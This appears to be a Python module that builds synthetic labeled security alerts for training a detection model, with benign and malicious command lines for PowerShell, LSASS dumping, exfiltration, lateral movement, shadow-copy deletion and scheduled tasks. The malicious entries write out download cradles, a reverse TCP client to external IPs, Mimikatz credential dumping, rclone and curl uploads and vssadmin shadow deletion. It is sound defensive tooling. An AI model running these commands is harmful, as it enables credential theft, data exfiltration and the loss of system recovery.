"""Synthetic labeled alerts for training and evaluation.

Each scenario is tied to the ATT&CK technique its detection rule targets. Benign scenarios
share techniques with malicious ones (admins run PsExec, backups move a lot of data), so the
risk model has to separate them on behavior rather than on the rule that fired.
"""

import base64
import random
from datetime import UTC, datetime, timedelta

from .schemas import Alert

HOSTS = ["fin-ws-%02d" % i for i in range(1, 40)] + ["dc-01", "dc-02", "sql-prod-01", "web-03", "hr-ws-07"]
CRITICAL = {"dc-01": 3, "dc-02": 3, "sql-prod-01": 3, "web-03": 2}
USERS = ["jsmith", "akumar", "mlopez", "tnguyen", "bwhite", "rpatel", "kchen", "dmartin"]
ADMINS = ["adm_jsmith", "adm_rpatel", "svc_backup", "svc_deploy"]
EXTERNAL_IPS = ["185.220.101.%d" % i for i in range(1, 60)] + ["45.155.205.%d" % i for i in range(1, 40)]
GENERIC_RULES = ["EDR Detection", "Suspicious Activity", "Defender for Endpoint Alert", "Analytics Rule Match",
                 "Anomalous Behavior", "Medium Severity Alert"]
INTERNAL_IPS = ["10.0.%d.%d" % (a, b) for a in range(1, 5) for b in range(10, 60)]


def _b64(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def _powershell(r: random.Random, malicious: bool) -> dict:
    if malicious:
        payload = r.choice([
            "IEX (New-Object Net.WebClient).DownloadString('http://%s/a.ps1')" % r.choice(EXTERNAL_IPS),
            "$c=New-Object Net.Sockets.TCPClient('%s',443)" % r.choice(EXTERNAL_IPS),
            "Invoke-Mimikatz -DumpCreds",
        ])
        cmd = r.choice([
            "powershell.exe -nop -w hidden -enc " + _b64(payload),
            "powershell -ExecutionPolicy Bypass -c \"%s\"" % payload,
        ])
        return dict(
            rule_name=r.choice(["Suspicious PowerShell Execution", "Encoded PowerShell Command",
                                "PowerShell Download Cradle"]),
            process="powershell.exe",
            parent_process=r.choice(["winword.exe", "outlook.exe", "excel.exe", "wscript.exe", "explorer.exe"]),
            command_line=cmd,
            description="PowerShell launched with obfuscated or remote-download arguments",
        )
    return dict(
        rule_name=r.choice(["Suspicious PowerShell Execution", "PowerShell Script Block Logging"]),
        process="powershell.exe",
        parent_process=r.choice(["explorer.exe", "svchost.exe", "ccmexec.exe"]),
        command_line=r.choice([
            "powershell.exe -File C:\\IT\\Scripts\\Get-DiskReport.ps1",
            "powershell -c Get-Service | Where Status -eq Stopped",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Program Files\\SCCM\\inventory.ps1",
            "powershell.exe -enc " + _b64("Get-WindowsUpdateLog"),
        ]),
        description="PowerShell executed by IT automation",
    )


def _bruteforce(r: random.Random, malicious: bool) -> dict:
    return dict(
        rule_name=r.choice(["Multiple Failed Logins", "Password Spray Detected", "Excessive Authentication Failures"]),
        process="",
        description="Repeated authentication failures against one or more accounts",
        failed_logins=r.randint(25, 400) if malicious else r.randint(3, 30),
        src_ip=r.choice(EXTERNAL_IPS) if malicious or r.random() < 0.2 else r.choice(INTERNAL_IPS),
        geo_mismatch=malicious and r.random() < 0.6,
    )


def _valid_accounts(r: random.Random, malicious: bool) -> dict:
    return dict(
        rule_name=r.choice(["Impossible Travel Sign-In", "Sign-In From New Country", "Atypical Sign-In Location"]),
        process="",
        description="Successful sign-in from an unusual location for this user",
        src_ip=r.choice(EXTERNAL_IPS) if malicious else r.choice(INTERNAL_IPS + EXTERNAL_IPS[:5]),
        geo_mismatch=True if malicious else r.random() < 0.5,
        failed_logins=r.randint(0, 12) if malicious else r.randint(0, 2),
    )


def _lsass(r: random.Random, malicious: bool) -> dict:
    if malicious:
        proc, cmd = r.choice([
            ("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"),
            ("procdump.exe", "procdump.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"),
            ("taskmgr.exe", "taskmgr.exe /dump lsass"),
        ])
    else:
        proc, cmd = r.choice([
            ("MsMpEng.exe", "MsMpEng.exe scan lsass memory"),
            ("WerFault.exe", "WerFault.exe -u -p 624 -s 1188"),
            ("procdump.exe", "procdump.exe -ma w3wp.exe C:\\dumps\\iis.dmp"),
        ])
    return dict(
        rule_name=r.choice(["LSASS Memory Access", "Credential Dumping Attempt", "Process Dump of LSASS"]),
        process=proc,
        parent_process=r.choice(["cmd.exe", "powershell.exe", "services.exe"]),
        command_line=cmd,
        description="A process opened or dumped LSASS memory",
    )


def _exfil(r: random.Random, malicious: bool) -> dict:
    if malicious:
        proc, cmd = r.choice([
            ("rclone.exe", "rclone.exe copy \\\\fs01\\finance mega:dump --transfers 16"),
            ("curl.exe", "curl.exe -T archive.7z https://%s/upload" % r.choice(EXTERNAL_IPS)),
            ("7z.exe", "7z.exe a -pP@ss C:\\temp\\out.7z \\\\fs01\\hr"),
        ])
    else:
        proc, cmd = r.choice([
            ("veeam.exe", "veeam.exe backup --job nightly-sql"),
            ("OneDrive.exe", "OneDrive.exe /sync"),
            ("robocopy.exe", "robocopy \\\\fs01\\share \\\\backup01\\share /MIR"),
        ])
    return dict(
        rule_name=r.choice(["Large Outbound Transfer", "Data Exfiltration Volume Anomaly", "Unusual Upload Volume"]),
        process=proc,
        parent_process="cmd.exe" if malicious else "services.exe",
        command_line=cmd,
        description="Outbound data volume well above this host's baseline",
        bytes_out=r.randint(2_000_000_000, 40_000_000_000) if malicious else r.randint(300_000_000, 25_000_000_000),
        dst_ip=r.choice(EXTERNAL_IPS) if malicious else r.choice(INTERNAL_IPS + EXTERNAL_IPS[:3]),
        distinct_destinations=r.randint(1, 4),
    )


def _lateral(r: random.Random, malicious: bool) -> dict:
    if malicious:
        proc, cmd = r.choice([
            ("psexec.exe", "psexec.exe \\\\%s -s -d cmd.exe /c whoami" % r.choice(HOSTS)),
            ("wmic.exe", "wmic /node:%s process call create \"cmd /c net user\"" % r.choice(HOSTS)),
            ("cmd.exe", "cmd.exe /c net use \\\\%s\\ADMIN$ /user:corp\\adm_jsmith" % r.choice(HOSTS)),
        ])
    else:
        proc, cmd = r.choice([
            ("psexec.exe", "psexec.exe \\\\%s -accepteula C:\\IT\\patch.cmd" % r.choice(HOSTS)),
            ("ccmexec.exe", "ccmexec.exe deploy package PKG0042"),
        ])
    return dict(
        rule_name=r.choice(["Remote Service Execution", "PsExec Lateral Movement", "Admin Share Access"]),
        process=proc,
        parent_process=r.choice(["cmd.exe", "powershell.exe"]) if malicious else "services.exe",
        command_line=cmd,
        description="Remote execution or admin share access to another host",
        distinct_destinations=r.randint(4, 60) if malicious else r.randint(1, 25),
    )


def _ransomware(r: random.Random, malicious: bool) -> dict:
    if malicious:
        cmd = r.choice([
            "vssadmin.exe delete shadows /all /quiet",
            "wmic shadowcopy delete",
            "bcdedit /set {default} recoveryenabled no",
        ])
        proc = cmd.split()[0]
    else:
        cmd = r.choice(["vssadmin.exe list shadows", "vssadmin.exe create shadow /for=C:", "wbadmin get versions"])
        proc = cmd.split()[0]
    return dict(
        rule_name=r.choice(["Shadow Copy Deletion", "Recovery Inhibition", "Volume Shadow Copy Tampering"]),
        process=proc,
        parent_process=r.choice(["cmd.exe", "powershell.exe"]) if malicious else "svchost.exe",
        command_line=cmd,
        description="Command that touches shadow copies or system recovery settings",
    )


def _schtask(r: random.Random, malicious: bool) -> dict:
    if malicious:
        cmd = "schtasks /create /sc minute /mo 15 /tn \"%s\" /tr \"%s\"" % (
            r.choice(["OneDriveUpdate", "WinSvcHelper", "ChromeCheck"]),
            r.choice(["powershell -w hidden -enc " + _b64("iwr http://x/p"), "C:\\Users\\Public\\svc.exe"]),
        )
    else:
        cmd = "schtasks /create /sc daily /tn \"%s\" /tr \"%s\"" % (
            r.choice(["DiskCleanup", "InventoryScan", "BackupVerify"]),
            r.choice(["C:\\IT\\cleanup.cmd", "C:\\Program Files\\Agent\\scan.exe"]),
        )
    return dict(
        rule_name=r.choice(["Scheduled Task Created", "Suspicious Scheduled Task", "Persistence via Task Scheduler"]),
        process="schtasks.exe",
        parent_process=r.choice(["cmd.exe", "powershell.exe", "wscript.exe"]) if malicious else "ccmexec.exe",
        command_line=cmd,
        description="A new scheduled task was registered",
    )


SCENARIOS = {
    "T1059.001": _powershell,
    "T1110": _bruteforce,
    "T1078": _valid_accounts,
    "T1003.001": _lsass,
    "T1048": _exfil,
    "T1021.002": _lateral,
    "T1490": _ransomware,
    "T1053.005": _schtask,
}


def generate(n: int, seed: int, malicious_rate: float = 0.35, label_noise: float = 0.04,
             generic_rate: float = 0.3) -> list[tuple[Alert, int, str]]:
    """Return (alert, label, technique_id) triples. label is 1 for malicious."""
    r = random.Random(seed)
    start = datetime(2026, 1, 1, tzinfo=UTC)
    out = []
    for i in range(n):
        technique = r.choice(list(SCENARIOS))
        malicious = r.random() < malicious_rate
        fields = SCENARIOS[technique](r, malicious)
        # Many SIEM alerts carry a vendor-generic title, so the technique has to come from the evidence.
        if r.random() < generic_rate:
            fields["rule_name"] = r.choice(GENERIC_RULES)
            fields["description"] = r.choice(["", "Behavior flagged by endpoint sensor", "Anomaly detected"])
        host = r.choice(HOSTS)
        privileged = r.random() < (0.45 if malicious else 0.25)
        hour = r.choice(range(0, 6)) if malicious and r.random() < 0.5 else r.randint(7, 19)
        alert = Alert(
            id=f"syn-{seed}-{i}",
            timestamp=start + timedelta(days=r.randint(0, 300), hours=hour, minutes=r.randint(0, 59)),
            host=host,
            user=r.choice(ADMINS if privileged else USERS),
            privileged_user=privileged,
            host_criticality=CRITICAL.get(host, 1),
            **fields,
        )
        label = int(malicious)
        # Analysts mislabel some alerts; the model should not be able to reach 100%.
        if r.random() < label_noise:
            label = 1 - label
        out.append((alert, label, technique))
    return out
